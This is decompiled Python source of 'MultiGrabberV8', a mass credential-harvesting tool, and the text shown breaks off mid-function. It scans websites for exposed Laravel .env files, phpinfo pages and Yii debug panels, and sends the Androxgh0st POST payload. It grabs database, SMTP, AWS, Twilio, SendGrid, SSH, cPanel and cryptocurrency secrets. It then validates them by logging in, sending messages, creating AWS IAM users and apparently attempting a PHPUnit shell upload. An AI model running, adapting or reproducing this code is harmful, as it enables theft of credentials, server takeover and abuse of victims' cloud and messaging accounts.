# Source Generated with Decompyle++
# File: MultiGrabberV8.pyc (Python 3.10)

import base64
import os
import platform
import random
import subprocess
import requests
from concurrent.futures import ThreadPoolExecutor as Pool2
from art import text2art
from colorama import Fore, Style
import ctypes
import urllib3
from scripts.cpanel_tester import checkcpanel
from scripts.ssh_tester import check_ssh
from scripts.databases import startum
from scripts.nexmo_tester import nexmo_checker
from scripts.twilio_tester import twilio_checker
from scripts.smtp_tester import smtp_test
from scripts.sendgrid_tester import check_sendgrid
from scripts.aws_tester import check_aws_smtp, createiam
from scripts.phpinfoclasses import Phpinfo
from scripts.laravelclass import Laravel
from scripts.laravel2 import Laravel2
from scripts.wordpressclasses import laravel_wordpress
from scripts.frontend import Symphony
from scripts import config_json, yii_debug
from scripts.get_star import Getstars
from scripts.shell_classes import Shellup
from scripts.laravel_ci_classes import CILaravel
from scripts.gitconfig_class import CheckGit
from scripts.logos import lof, log

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
errors = (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout,
          requests.exceptions.BaseHTTPError, requests.exceptions.HTTPError,
          requests.exceptions.InvalidHeader, requests.exceptions.ConnectTimeout,
          requests.exceptions.TooManyRedirects, requests.exceptions.RequestException,
          requests.exceptions.RequestsWarning, requests.exceptions.Timeout,
          requests.exceptions.InvalidURL, requests.exceptions.RequestsDependencyWarning)

try:
    os.mkdir("Results")
except:
    pass


def printf(text):
    ''.join([str(item) for item in text])
    print((text + '\n'), end=' ')


def clear():
    if platform.system() == "Windows":
        subprocess.call('cls', shell=True)
    else:
        subprocess.call('clear', shell=True)


bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
cyan = Fore.CYAN
res = Style.RESET_ALL
yl = Fore.YELLOW
gr2 = Fore.LIGHTGREEN_EX
red2 = Fore.LIGHTRED_EX
yl2 = Fore.LIGHTYELLOW_EX
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
voorkant = "http://", "https://"
porten = ":80", ":443"
path1 = {"/_profiler/phpinfo", "/info.php", "/phpinfo.php", "/?phpinfo=1"}
path = {"/.env", "/.env.save", "/.env.old", "/.env.prod", "/.env.production", "/.env.production.local",
        "/.env.development", "/.env.development.local", "/admin-app/.env", "/api/.env", "/app/.env",
        "/development/.env"}
good_hits = 0
bad_hits = 0
errors_hits = 0


class Exploits:
    def __init__(self):
        self.headers3 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 '
                                       'Firefox/77.0'}
        self.laravel_path = {"/.env", "/.env.save", "/.env.old", "/.env.prod", "/.env.production",
                             "/.env.development", "/laravel/.env", "/admin-app/.env", "/api/.env",
                             "/app/.env", "/development/.env",
                             "/apps/.env", "/cp/.env", "/private/.env", "/system/.env", "/docker/.env", "/cms/.env",
                             "/script/.env", "/live_env", "/application/.env", "/.env.project", "/.env.dist",
                             "/back/.env", "/core/.env", "/docker/.env", "/fedex/.env", "/local/.env", "/rest/.env",
                             "/shared/.env", "/sources/.env", "/enviroments/.env.production", "/enviroments/.env"}
        self.phpinfo_path = {"/_profiler/phpinfo", "/phpinfo.php", "/info.php", "/?phpinfo=1"}
        self.yii_path = "/debug/default/view?panel=config"
        self.json_path = {"/config.json", "/.json"}
        self.frontdev_path = "/frontend_dev.php/$"
        self.allow_redi = False
        self.veri = False
        self.timeout_sec = 5
        self.good_hits = 0
        self.bad_hits = 0
        self.errors_hits = 0
        self.totaal = len(stars)
        self.progress = 0

    def fix_url(self, star):
        stars = Getstars()
        star = stars.fix_star(star)
        return star

    def yii_debugger(self, star):
        page = False
        text = f"{bl}{star}{res} | {yl}YII_DEBUG ENV{res} "
        url = star + self.yii_path
        try:
            check = requests.get(url, headers=headers, timeout=self.timeout_sec,
                                 allow_redirects=self.allow_redi, verify=self.veri).text
            if "Yii Version" in check:
                page = check
            if page:
                kiko_hits = 0
                database = yii_debug.grabdatabase(page, star)
                smtps = yii_debug.smtps(page, url)
                amazone = yii_debug.Yii_AWS(page)
                if database:
                    kiko_hits += 1
                    text += f' | {gr}DATABASE GRABBED{res}!'
                    url = database[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    if url == '':
                        url = star
                    else:
                        url = url
                    methods = database[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    db_connection = database[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    db_host = database[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    db_port = database[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    db_database = database[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    db_username = database[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    db_password = database[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    test_database = startum(url, methods, db_connection, db_host, db_port, db_database, db_username,
                                            db_password)
                    if test_database == "BAD_DATABASE":
                        text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                    else:
                        text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                if smtps:
                    kiko_hits += 1
                    text += f' | {gr}SMTP GRABBED{res}!'
                    smtp_host = smtps[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    smtp_port = str(smtps[1]).replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    smtp_username = smtps[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    smtp_password = smtps[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    smtp_from = smtps[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                    if "apikey" in smtp_username and "SG." in smtp_password:
                        methods = "/SENDGRID_SMTP"
                        test_sendgrid = check_sendgrid(url, methods, smtp_password)
                        if test_sendgrid[0] == "GOOD_SENDGRID":
                            smtp_from = test_sendgrid[1]
                    if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                        text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                    else:
                        text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                if amazone:
                    kiko_hits += 1
                    text += f' | {bl}AWS GRABBED{res}!'
                    methods = "/AMAZON_AWS"
                    aws_key = amazone[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'", "")
                    aws_sec = amazone[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'", "")
                    aws_region = amazone[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                         '').replace(
                        "'", "")
                    test_aws_smtp = check_aws_smtp(url, methods, aws_key, aws_sec, aws_region)
                    test_aws_iam = createiam(aws_key, aws_sec, aws_region)
                    if test_aws_smtp == "GOOD_SES":
                        text += f" {yl2}({res}{gr2}{test_aws_smtp}{res}!{yl2}){res}"
                    elif test_aws_smtp == "BAD_SES":
                        text += f" {yl2}({res}{red2}{test_aws_smtp}{res}!{yl2}){res}"
                    if test_aws_iam == "GOOD_IAM":
                        text += f"{gr2}/{res}{yl2}({res}{gr2}{test_aws_iam}{res}!{yl2}){res} "
                    elif test_aws_iam == "BAD_IAM":
                        text += f"{gr2}/{res}{yl2}({res}{red2}{test_aws_iam}{res}!{yl2}){res} "
                shell = Shellup()
                shell.phpunit(star)
                if kiko_hits == 0:
                    self.bad_hits += 1
                    text += f' | {red}NOT YII_DEBUG{res}!'
                    printf(text)
                    self.bad_hits += 1
                    return False
                self.good_hits += 1
                print(text)
                return True
            else:
                text += f' | {red}NOT YII_DEBUG{res}!'
                printf(text)
                self.bad_hits += 1
                return False
        except Exception:
            self.errors_hits += 1
            return False

    def laravelcheck(self, star):
        global method
        page = False
        text = f"{bl}{star}{res} | {yl}LARAVEL{res} "
        for achter in self.laravel_path:
            url = star + achter
            try:
                zoeken = requests.get(url, headers=self.headers3, timeout=self.timeout_sec,
                                      allow_redirects=self.allow_redi, verify=self.veri)
                if "APP_ENV=" in zoeken.text or "APP_KEY=" in zoeken.text or "APP_DEBUG=" in zoeken.text \
                        or "DB_PASSWORD=" in \
                        zoeken.text or "WP_HOME" in zoeken.text or "WP_ENV" in zoeken.text or \
                        "AWS_ACCESS" in zoeken.text or "SMTP_HOST" in zoeken.text \
                        or "CI_ENVIRONMENT" in zoeken.text or "APP_URL" in zoeken.text:
                    page = zoeken.text
                else:
                    zoeken = requests.post(url, data={"0x[]": "androxgh0st"}, headers=self.headers3,
                                           timeout=self.timeout_sec, verify=False, allow_redirects=False)
                    if "<td>APP_KEY</td>" in zoeken.text or "<td>APP_KEY<\\/td>" in zoeken.text or "<td>APP_KEY<\/td>" \
                            in zoeken.text or "<td>APP_ENV</td>" in zoeken.text or "<td>DB_PASSWORD</td>" in zoeken.text:
                        page = zoeken.text
                if page:
                    Laravelp1 = Laravel()
                    Laravelp2 = Laravel2()
                    Laracelp3 = CILaravel()
                    database = Laravelp1.databases(page, star)
                    database3 = laravel_wordpress(page, star)
                    amazon = Laravelp1.amazon(page)
                    grab_nexmo = Laravelp1.nexmo_apis(page)
                    twilio = Laravelp1.twilio_apis(page)
                    smtps = Laravelp1.smtps(page, url)
                    Laravelp1.get_sms_apis(page)
                    sms_apis = Laravelp1.get_sms_apis(page)
                    dnsdb1 = Laravelp1.laravel_dns(page, star)
                    ssh = Laravelp2.grab_ssh(page)
                    cpanel = Laravelp2.grab_cpanel(star, page)
                    amazon2 = Laravelp1.get_aws_data(page)
                    amazon3 = Laravelp1.amazon_sessie(page)
                    Laravelp2.grab_privatekey2(page, star)
                    Laravelp2.grab_binance_api(page, star)
                    Laravelp2.grab_binance_pay(page, star)
                    Laravelp2.grab_binance_privatekeys(page, star)
                    Laravelp2.grab_bitcoin(page, star)
                    Laravelp2.grab_blockchain(page, star)
                    Laravelp2.grab_google(page)
                    Laravelp2.grab_facebook(page)
                    Laravelp2.grab_perfectmony(page)
                    Laravelp2.grab_btcrpc(page, star)
                    Laravelp2.grab_coinpayment(page, star)
                    Laravelp2.grab_cryptopay(page, star)
                    Laravelp2.grab_privatekey_pass(page, star)
                    Laravelp2.grab_private_key(page, star)
                    sendje = Laravelp2.grab_sendgrid(page)
                    database2 = Laracelp3.databases(page, star)
                    smtps2 = Laracelp3.smtps(page, star)
                    twilio2 = Laracelp3.twilio_apis(page)
                    kiko_hits = 0
                    if database:
                        kiko_hits += 1
                        text += f' | {gr}DATABASE GRABBED{res}!'
                        url = database[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if url == '':
                            url = star
                        else:
                            url = url
                        method = database[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_connection = database[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                 '')
                        db_host = database[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_port = database[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_database = database[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_username = database[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_password = database[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        test_database = startum(url, method, db_connection, db_host, db_port, db_database, db_username,
                                                db_password)
                        if test_database == "BAD_DATABASE":
                            text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                    if database2:
                        kiko_hits += 1
                        text += f' | {gr}DATABASE2 GRABBED{res}!'
                        url = database2[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if url == '':
                            url = star
                        else:
                            url = url
                        method = database2[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_connection = database2[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                  '')
                        db_host = database2[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_port = database2[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_database = database2[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_username = database2[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_password = database2[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        test_database = startum(url, method, db_connection, db_host, db_port, db_database, db_username,
                                                db_password)
                        if test_database == "BAD_DATABASE":
                            text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                    if amazon:
                        kiko_hits += 1
                        method = "/AMAZON_AWS"
                        text += f' | {bl}AWS GRABBED{res}!'
                        aws_key = amazon[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                         '').replace(
                            "'", "")
                        aws_sec = amazon[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                         '').replace(
                            "'", "")
                        aws_region = amazon[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                            '').replace(
                            "'", "")
                        test_aws_smtp = check_aws_smtp(url, method, aws_key, aws_sec, aws_region)
                        test_aws_iam = createiam(aws_key, aws_sec, aws_region)
                        if test_aws_smtp == "GOOD_SES":
                            text += f" {yl2}({res}{gr2}{test_aws_smtp}{res}!{yl2}){res}"
                        elif test_aws_smtp == "BAD_SES":
                            text += f" {yl2}({res}{red2}{test_aws_smtp}{res}!{yl2}){res}"
                        if test_aws_iam == "GOOD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{gr2}{test_aws_iam}{res}!{yl2}){res} "
                        elif test_aws_iam == "BAD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{red2}{test_aws_iam}{res}!{yl2}){res} "
                    if grab_nexmo:
                        kiko_hits += 1
                        text += f' | {bl}NEXMO_API GRABBED{res}!'
                        nexmo_api = grab_nexmo[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                               '').replace(
                            "'", "")
                        nexmo_secretkey = grab_nexmo[1].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        test_nemxokeys = nexmo_checker(nexmo_api, nexmo_secretkey)
                        if test_nemxokeys == "SMS_SEND":
                            text += f" {yl2}({res}{gr2}SMS_SEND{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}SMS_API_FAILED{res}!{yl2}){res} "
                    if twilio:
                        kiko_hits += 1
                        text += f' | {yl}TWILIO API GRABBED{res}!'
                        acc_key = twilio[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                         '').replace(
                            "'", "")
                        acc_sec = twilio[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                         '').replace(
                            "'", "")
                        test_twiliokeys = twilio_checker(acc_key, acc_sec).replace("\r", "").replace("\n", "").replace(
                            " ", "").replace('"', '').replace("'", "")
                        if test_twiliokeys == "TWILIO_SMS_SEND":
                            text += f" {yl2}({res}{gr2}{test_twiliokeys}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}{test_twiliokeys}{res}!{yl2}){res} "
                    if twilio2:
                        kiko_hits += 1
                        text += f' | {yl}TWILIO API2 GRABBED{res}!'
                        acc_key = twilio2[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        acc_sec = twilio2[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        test_twiliokeys = twilio_checker(acc_key, acc_sec).replace("\r", "").replace("\n", "").replace(
                            " ", "").replace('"', '').replace("'", "")
                        if test_twiliokeys == "TWILIO_SMS_SEND":
                            text += f" {yl2}({res}{gr2}{test_twiliokeys}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}{test_twiliokeys}{res}!{yl2}){res} "
                    if smtps:
                        kiko_hits += 1
                        text += f' | {gr}SMTP GRABBED{res}!'
                        smtp_host = smtps[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        smtp_port = smtps[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        smtp_username = smtps[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                            "'", "")
                        smtp_password = smtps[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                            "'", "")
                        smtp_from = smtps[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        if "apikey" in smtp_username and "SG." in smtp_password:
                            method = "/SENDGRID_SMTP"
                            test_sendgrid = check_sendgrid(url, method, smtp_password)
                            if test_sendgrid[0] == "GOOD_SENDGRID":
                                smtp_from = test_sendgrid[1]
                        if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                            text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                    if smtps2:
                        kiko_hits += 1
                        text += f' | {gr}SMTP2 GRABBED{res}!'
                        smtp_host = smtps2[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                           '').replace(
                            "'", "")
                        smtp_port = smtps2[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                           '').replace(
                            "'", "")
                        smtp_username = smtps2[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                               '').replace(
                            "'", "")
                        smtp_password = smtps2[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                               '').replace(
                            "'", "")
                        smtp_from = smtps2[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                           '').replace(
                            "'", "")
                        if "apikey" in smtp_username and "SG." in smtp_password:
                            method = "/SENDGRID_SMTP"
                            test_sendgrid = check_sendgrid(url, method, smtp_password)
                            if test_sendgrid[0] == "GOOD_SENDGRID":
                                smtp_from = test_sendgrid[1]
                        if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                            text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                    if sms_apis:
                        kiko_hits += 1
                        text += f' | {bl}SMS API GRABBED{res}!'
                    if dnsdb1:
                        kiko_hits += 1
                        text += f' | {yl}LARAVEL DNS GRABBED{res}!'
                        url = dnsdb1[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if url == '':
                            url = star
                        else:
                            url = url
                        method = dnsdb1[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_connection = dnsdb1[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_host = dnsdb1[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_port = dnsdb1[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_database = dnsdb1[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_username = dnsdb1[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_password = dnsdb1[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        test_database = startum(url, method, db_connection, db_host, db_port, db_database, db_username,
                                                db_password)
                        if test_database == "BAD_DATABASE":
                            text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                    if cpanel:
                        kiko_hits += 1
                        cpanel_host = cpanel[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                             '').replace(
                            "'", "")
                        cpanel_username = cpanel[1].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"',
                            '').replace(
                            "'", "")
                        cpanel_password = cpanel[2].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"',
                            '').replace(
                            "'", "")
                        checkcpanel(star, cpanel_host, cpanel_username, cpanel_password)
                    if ssh:
                        kiko_hits += 1
                        ssh_host = ssh[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                       '').replace(
                            "'", "")
                        ssh_username = ssh[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                           '').replace(
                            "'", "")
                        ssh_password = ssh[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                           '').replace(
                            "'", "")
                        check_ssh(star, ssh_host, ssh_username, ssh_password)
                    if sendje:
                        kiko_hits += 1
                        sendgrid_password = sendje[0].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        method = "/SENDGRID"
                        check_sendgrid(url, method, sendgrid_password)
                    if amazon2:
                        kiko_hits += 1
                        method = "/AMAZON_AWS"
                        aws_key = amazon2[0].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        aws_sec = amazon2[1].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        aws_region = amazon2[2].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        test_aws_smtp = check_aws_smtp(url, method, aws_key, aws_sec, aws_region)
                        test_aws_iam = createiam(aws_key, aws_sec, aws_region)
                        if test_aws_smtp == "GOOD_SES":
                            text += f" {yl2}({res}{gr2}{test_aws_smtp}{res}!{yl2}){res}"
                        elif test_aws_smtp == "BAD_SES":
                            text += f" {yl2}({res}{red2}{test_aws_smtp}{res}!{yl2}){res}"
                        if test_aws_iam == "GOOD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{gr2}{test_aws_iam}{res}!{yl2}){res} "
                        elif test_aws_iam == "BAD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{red2}{test_aws_iam}{res}!{yl2}){res} "
                    if amazon3:
                        kiko_hits += 1
                        method = "/AMAZON_AWS"
                        aws_key = amazon3[0].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        aws_sec = amazon3[1].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        aws_region = amazon3[2].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        test_aws_smtp = check_aws_smtp(url, method, aws_key, aws_sec, aws_region)
                        test_aws_iam = createiam(aws_key, aws_sec, aws_region)
                        if test_aws_smtp == "GOOD_SES":
                            text += f" {yl2}({res}{gr2}{test_aws_smtp}{res}!{yl2}){res}"
                        elif test_aws_smtp == "BAD_SES":
                            text += f" {yl2}({res}{red2}{test_aws_smtp}{res}!{yl2}){res}"
                        if test_aws_iam == "GOOD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{gr2}{test_aws_iam}{res}!{yl2}){res} "
                        elif test_aws_iam == "BAD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{red2}{test_aws_iam}{res}!{yl2}){res} "
                    if database3:
                        kiko_hits += 1
                        text += f' | {gr}WP_DATABASE GRABBED{res}!'
                        url = database[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if url == '':
                            url = star
                        else:
                            url = url
                        methods = database[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_connection = database[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                 '')
                        db_host = database[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_port = database[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_database = database[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_username = database[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_password = database[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        test_database = startum(url, methods, db_connection, db_host, db_port, db_database, db_username,
                                                db_password)
                        if test_database == "BAD_DATABASE":
                            text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                    shell = Shellup()
                    shell.phpunit(star)
                    if kiko_hits == 0:
                        self.bad_hits += 1
                        text2 = f"{bl}{star}{res} | {yl}LARAVEL{res} "
                        text2 += f'| {red}NOT LARAVEL{res}!'
                        print(text2)
                        return False
                    else:
                        print(text)
                        self.good_hits += 1
                        return True
                else:
                    text2 = f"{bl}{star}{res} | {yl}LARAVEL{res} "
                    text2 += f'| {red}NOT LARAVEL{res}!'
                    print(text2)
                    self.bad_hits += 1
            except Exception as e:
                self.errors_hits += 1
                return False

    def phpinfo(self, star):
        global check
        page = False
        text = f"{bl}{star}{res} |{yl} PHPINFO{res} "
        for achter in self.phpinfo_path:
            url = star + achter
            try:
                check = requests.get(url, headers=self.headers3, timeout=self.timeout_sec,
                                     allow_redirects=self.allow_redi, verify=self.veri)
                if "<h2>Environment</h2>" in check.text or "<h2>PHP Variables</h2>" in check.text:
                    page = check.text
                if page:
                    kiko_hits = 0
                    php_grab = Phpinfo()
                    database = php_grab.php_databases(page, star)
                    smtps = php_grab.php_smtp(page, url)
                    aws = php_grab.php_aws(page)
                    dns_urls = php_grab.php_urls(page, star)
                    mailer_urls = php_grab.php_mailer_urls(page, url)
                    if database:
                        kiko_hits += 1
                        text += f' | {gr}DATABASES GRABBED{res}!'
                        url = database[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if url == '':
                            url = star
                        else:
                            url = url
                        methods = database[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_connection = database[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                 '')
                        db_host = database[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_port = database[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_username = database[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_password = database[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_database = database[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if db_database == '':
                            db_database = db_username
                        else:
                            db_database = db_database
                        test_database = startum(url, methods, db_connection, db_host, db_port, db_database, db_username,
                                                db_password)
                        if test_database == "BAD_DATABASE":
                            text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                    if smtps:
                        kiko_hits += 1
                        text += f' | {gr}SMTP GRABBED{res}!'
                        smtp_host = smtps[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        smtp_port = smtps[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        smtp_username = smtps[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                            "'", "")
                        smtp_password = smtps[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                            "'", "")
                        smtp_from = smtps[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        if "apikey" in smtp_username and "SG." in smtp_password:
                            methods = "/SENDGRID_SMTP"
                            test_sendgrid = check_sendgrid(url, methods, smtp_password)
                            if test_sendgrid[0] == "GOOD_SENDGRID":
                                smtp_from = test_sendgrid[1]
                        if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                            text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                    if aws:
                        kiko_hits += 1
                        methods = "/AMAZON_AWS"
                        text += f' | {bl}AWS GRABBED{res}!'
                        aws_key = aws[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                            "'", "")
                        aws_sec = aws[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                            "'", "")
                        aws_region = aws[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                         '').replace(
                            "'", "")
                        test_aws_smtp = check_aws_smtp(url, methods, aws_key, aws_sec, aws_region)
                        test_aws_iam = createiam(aws_key, aws_sec, aws_region)
                        if test_aws_smtp == "GOOD_SES":
                            text += f" {yl2}({res}{gr2}{test_aws_smtp}{res}!{yl2}){res}"
                        elif test_aws_smtp == "BAD_SES":
                            text += f" {yl2}({res}{red2}{test_aws_smtp}{res}!{yl2}){res}"
                        if test_aws_iam == "GOOD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{gr2}{test_aws_iam}{res}!{yl2}){res} "
                        elif test_aws_iam == "BAD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{red2}{test_aws_iam}{res}!{yl2}){res} "
                    if dns_urls:
                        kiko_hits += 1
                        text += f' | {gr}DNS URLS GRABBED{res}!'
                        url = dns_urls[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        methods = dns_urls[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_connection = dns_urls[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                 '')
                        db_host = dns_urls[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
